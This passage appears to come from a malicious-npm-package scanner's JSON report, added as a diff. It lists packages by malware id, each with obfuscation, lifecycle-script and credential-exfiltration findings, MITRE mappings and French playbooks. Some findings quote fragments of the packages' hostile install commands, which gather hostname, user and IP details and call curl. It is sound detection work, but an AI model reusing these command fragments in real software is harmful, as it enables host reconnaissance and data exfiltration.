+          "message": "Suspicious flow: credentials read (privateKey, mnemonic, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, mnemonic, mnemonic, privateKey, privateKey, privateKey, mnemonic, privateKey, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, privateKey, privateKey) + network send (fetch, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, request, request, request, get, get, get)",
+          "file": "dist\\ethers.umd.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 1
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "LOW",
+          "message": "Suspicious flow: credentials read (privateKey, mnemonic, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, mnemonic, mnemonic, privateKey, privateKey, privateKey, mnemonic, privateKey, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, privateKey, privateKey) + network send (fetch, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, request, request, request, get, get, get)",
+          "file": "dist\\ethers.umd.min.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 1
+        },
+        {
+          "type": "js_obfuscation_pattern",
+          "severity": "HIGH",
+          "message": "JS obfuscator hex variables detected (123 unique _0x* vars) — signature of javascript-obfuscator/obfuscator.io",
+          "file": "vendor\\scrypt-js\\preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-ENTROPY-003",
+          "rule_name": "JS Obfuscation Pattern",
+          "confidence": "high",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/002/",
+            "https://attack.mitre.org/techniques/T1027/010/",
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027.002",
+          "playbook": "Pattern d'obfuscation JS detecte (variables _0x*, string arrays encodes, eval+payload, long base64). Analyser dans un sandbox. Comparer avec les signatures Shai-Hulud/chalk/debug.",
+          "points": 10
+        },
+        {
+          "type": "high_entropy_string",
+          "severity": "MEDIUM",
+          "message": "High entropy string (6.02 bits, 65 chars) — possible base64/hex/encrypted payload",
+          "file": "vendor\\scrypt-js\\preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-ENTROPY-001",
+          "rule_name": "High Entropy String",
+          "confidence": "medium",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "Chaine a haute entropie detectee. Verifier si c'est du base64, hex, ou un payload chiffre. Analyser le contexte d'utilisation.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-941",
+      "package": "ether-lint",
+      "version": "5.9.1",
+      "all_versions": [
+        "5.9.1",
+        "5.9.4"
+      ],
+      "published": "2026-02-12T16:02:40Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 44,
+      "threat_count": 5,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "dangerous_call_function",
+          "severity": "MEDIUM",
+          "message": "Function() with dynamic expression (template/factory pattern).",
+          "file": "vendor\\scrypt-js\\preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-005",
+          "rule_name": "new Function() Constructor",
+          "confidence": "high",
+          "references": [
+            "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"
+          ],
+          "mitre": "T1059.007",
+          "playbook": "Appel new Function() detecte. Equivalent a eval(). Verifier la source des donnees.",
+          "points": 3
+        },
+        {
+          "type": "obfuscation_detected",
+          "severity": "CRITICAL",
+          "message": "Code obfusque (score: 80). Signaux: long_single_lines, hex_escapes, obfuscated_variables",
+          "file": "vendor\\scrypt-js\\preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-OBF-001",
+          "rule_name": "Code Obfuscation Detected",
+          "confidence": "medium",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027",
+          "playbook": "Code volontairement obscurci. Analyser dans un environnement isole. Probable malware.",
+          "points": 25
+        },
+        {
+          "type": "js_obfuscation_pattern",
+          "severity": "HIGH",
+          "message": "JS obfuscator hex variables detected (131 unique _0x* vars) — signature of javascript-obfuscator/obfuscator.io",
+          "file": "vendor\\scrypt-js\\preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-ENTROPY-003",
+          "rule_name": "JS Obfuscation Pattern",
+          "confidence": "high",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/002/",
+            "https://attack.mitre.org/techniques/T1027/010/",
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027.002",
+          "playbook": "Pattern d'obfuscation JS detecte (variables _0x*, string arrays encodes, eval+payload, long base64). Analyser dans un sandbox. Comparer avec les signatures Shai-Hulud/chalk/debug.",
+          "points": 10
+        },
+        {
+          "type": "high_entropy_string",
+          "severity": "MEDIUM",
+          "message": "High entropy string (6.02 bits, 65 chars) — possible base64/hex/encrypted payload",
+          "file": "vendor\\scrypt-js\\preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-ENTROPY-001",
+          "rule_name": "High Entropy String",
+          "confidence": "medium",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "Chaine a haute entropie detectee. Verifier si c'est du base64, hex, ou un payload chiffre. Analyser le contexte d'utilisation.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-939",
+      "package": "ably-forks",
+      "version": "1.0.1",
+      "all_versions": [
+        "1.0.1"
+      ],
+      "published": "2026-02-19T10:50:50Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.hostname, os.userInfo) + network send (request, http.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-929",
+      "package": "vds-monarch",
+      "version": "1.0.3",
+      "all_versions": [
+        "1.0.3"
+      ],
+      "published": "2026-02-17T15:55:37Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.hostname, os.userInfo) + network send (request, https.request)",
+          "file": "poc.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-908",
+      "package": "hops-preset-jest",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2026-02-15T15:57:34Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.hostname) + network send (get, https.get, dns.lookup, request, https.request)",
+          "file": "vishu.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-770",
+      "package": "xpack-per-user",
+      "version": "1.0.1",
+      "all_versions": [
+        "1.0.1"
+      ],
+      "published": "2026-02-05T18:36:26Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 13,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "dynamic_require",
+          "severity": "HIGH",
+          "message": "Dynamic require() with computed argument (possible decode obfuscation).",
+          "file": "preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-006",
+          "rule_name": "Dynamic Require with Concatenation",
+          "confidence": "high",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "require() avec concatenation detecte. Technique d'obfuscation pour masquer le module charge. Analyser les variables concatenees.",
+          "points": 10
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-1043",
+      "package": "uuindex",
+      "version": "13.1.0",
+      "all_versions": [
+        "13.1.0"
+      ],
+      "published": "2026-02-25T21:51:09Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 7,
+      "threat_count": 5,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"install\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "dynamic_require",
+          "severity": "LOW",
+          "message": "Dynamic require() with computed argument (possible decode obfuscation).",
+          "file": "vendor\\scrypt-js\\version.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-AST-006",
+          "rule_name": "Dynamic Require with Concatenation",
+          "confidence": "high",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "require() avec concatenation detecte. Technique d'obfuscation pour masquer le module charge. Analyser les variables concatenees.",
+          "points": 1
+        },
+        {
+          "type": "obfuscation_detected",
+          "severity": "LOW",
+          "message": "Code obfusque (score: 80). Signaux: long_single_lines, hex_escapes, obfuscated_variables",
+          "file": "vendor\\scrypt-js\\version.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-OBF-001",
+          "rule_name": "Code Obfuscation Detected",
+          "confidence": "medium",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027",
+          "playbook": "Code volontairement obscurci. Analyser dans un environnement isole. Probable malware.",
+          "points": 1
+        },
+        {
+          "type": "js_obfuscation_pattern",
+          "severity": "LOW",
+          "message": "JS obfuscator hex variables detected (178 unique _0x* vars) — signature of javascript-obfuscator/obfuscator.io",
+          "file": "vendor\\scrypt-js\\version.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-ENTROPY-003",
+          "rule_name": "JS Obfuscation Pattern",
+          "confidence": "high",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/002/",
+            "https://attack.mitre.org/techniques/T1027/010/",
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027.002",
+          "playbook": "Pattern d'obfuscation JS detecte (variables _0x*, string arrays encodes, eval+payload, long base64). Analyser dans un sandbox. Comparer avec les signatures Shai-Hulud/chalk/debug.",
+          "points": 1
+        },
+        {
+          "type": "high_entropy_string",
+          "severity": "LOW",
+          "message": "High entropy string (6.02 bits, 65 chars) — possible base64/hex/encrypted payload",
+          "file": "vendor\\scrypt-js\\version.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-ENTROPY-001",
+          "rule_name": "High Entropy String",
+          "confidence": "medium",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "Chaine a haute entropie detectee. Verifier si c'est du base64, hex, ou un payload chiffre. Analyser le contexte d'utilisation.",
+          "points": 1
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-1038",
+      "package": "promanage",
+      "version": "6.0.21",
+      "all_versions": [
+        "6.0.21"
+      ],
+      "published": "2026-02-25T22:31:19Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 7,
+      "threat_count": 5,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"install\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "dynamic_require",
+          "severity": "LOW",
+          "message": "Dynamic require() with computed argument (possible decode obfuscation).",
+          "file": "vendor\\scrypt-js\\version.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-AST-006",
+          "rule_name": "Dynamic Require with Concatenation",
+          "confidence": "high",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "require() avec concatenation detecte. Technique d'obfuscation pour masquer le module charge. Analyser les variables concatenees.",
+          "points": 1
+        },
+        {
+          "type": "obfuscation_detected",
+          "severity": "LOW",
+          "message": "Code obfusque (score: 80). Signaux: long_single_lines, hex_escapes, obfuscated_variables",
+          "file": "vendor\\scrypt-js\\version.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-OBF-001",
+          "rule_name": "Code Obfuscation Detected",
+          "confidence": "medium",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027",
+          "playbook": "Code volontairement obscurci. Analyser dans un environnement isole. Probable malware.",
+          "points": 1
+        },
+        {
+          "type": "js_obfuscation_pattern",
+          "severity": "LOW",
+          "message": "JS obfuscator hex variables detected (178 unique _0x* vars) — signature of javascript-obfuscator/obfuscator.io",
+          "file": "vendor\\scrypt-js\\version.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-ENTROPY-003",
+          "rule_name": "JS Obfuscation Pattern",
+          "confidence": "high",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/002/",
+            "https://attack.mitre.org/techniques/T1027/010/",
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027.002",
+          "playbook": "Pattern d'obfuscation JS detecte (variables _0x*, string arrays encodes, eval+payload, long base64). Analyser dans un sandbox. Comparer avec les signatures Shai-Hulud/chalk/debug.",
+          "points": 1
+        },
+        {
+          "type": "high_entropy_string",
+          "severity": "LOW",
+          "message": "High entropy string (6.02 bits, 65 chars) — possible base64/hex/encrypted payload",
+          "file": "vendor\\scrypt-js\\version.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-ENTROPY-001",
+          "rule_name": "High Entropy String",
+          "confidence": "medium",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "Chaine a haute entropie detectee. Verifier si c'est du base64, hex, ou un payload chiffre. Analyser le contexte d'utilisation.",
+          "points": 1
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-752",
+      "package": "ua.unitedforbusiness.frontend",
+      "version": "9.9.9",
+      "all_versions": [
+        "9.9.9",
+        "9.9.11",
+        "9.9.12"
+      ],
+      "published": "2025-01-31T03:01:05Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "dangerous_exec",
+          "severity": "CRITICAL",
+          "message": "Dangerous shell command in exec(): \"x=$(echo 'ua.unitedforbusiness.frontend'; date -u +'%a %b %d %Y %T GMT'; whoami;\"",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-007",
+          "rule_name": "Dangerous Shell Command Execution",
+          "confidence": "high",
+          "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection"
+          ],
+          "mitre": "T1059.004",
+          "playbook": "CRITIQUE: Execution de commande shell dangereuse detectee. Isoler la machine. Verifier si la commande a ete executee.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-731",
+      "package": "abha",
+      "version": "3.9.0",
+      "all_versions": [
+        "3.9.0"
+      ],
+      "published": "2025-01-31T03:01:05Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "dangerous_exec",
+          "severity": "CRITICAL",
+          "message": "Dangerous shell command in exec(): \"a=$(hostname;pwd;whoami;echo 'abha';curl https://ifconfig.me;) && echo $a | xxd \"",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-007",
+          "rule_name": "Dangerous Shell Command Execution",
+          "confidence": "high",
+          "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection"
+          ],
+          "mitre": "T1059.004",
+          "playbook": "CRITIQUE: Execution de commande shell dangereuse detectee. Isoler la machine. Verifier si la commande a ete executee.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-6815",
+      "package": "poloman",
+      "version": "9.2.1",
+      "all_versions": [
+        "9.2.1"
+      ],
+      "published": "2025-08-10T15:41:18Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "dangerous_exec",
+          "severity": "CRITICAL",
+          "message": "Dangerous shell command in exec(): \"\na=$(\n    hostname;\n    pwd;\n    whoami;\n    ip a;\n    echo 'poloman';\n    curl \"",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-007",
+          "rule_name": "Dangerous Shell Command Execution",
+          "confidence": "high",
+          "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection"
+          ],
+          "mitre": "T1059.004",
+          "playbook": "CRITIQUE: Execution de commande shell dangereuse detectee. Isoler la machine. Verifier si la commande a ete executee.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-6258",
+      "package": "redux-saga-task-cancel-rce",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-07-26T11:17:31Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-6257",
+      "package": "redux-saga-channel-end-rce",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-07-26T11:15:51Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-6256",
+      "package": "redux-replace-rce",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-07-26T11:15:37Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-6255",
+      "package": "redux-probe-unknown-action-rce",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-07-26T11:15:52Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-6254",
+      "package": "redux-init-rce",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-07-26T11:16:12Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-6253",
+      "package": "dva-update-rce",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-07-26T11:15:45Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
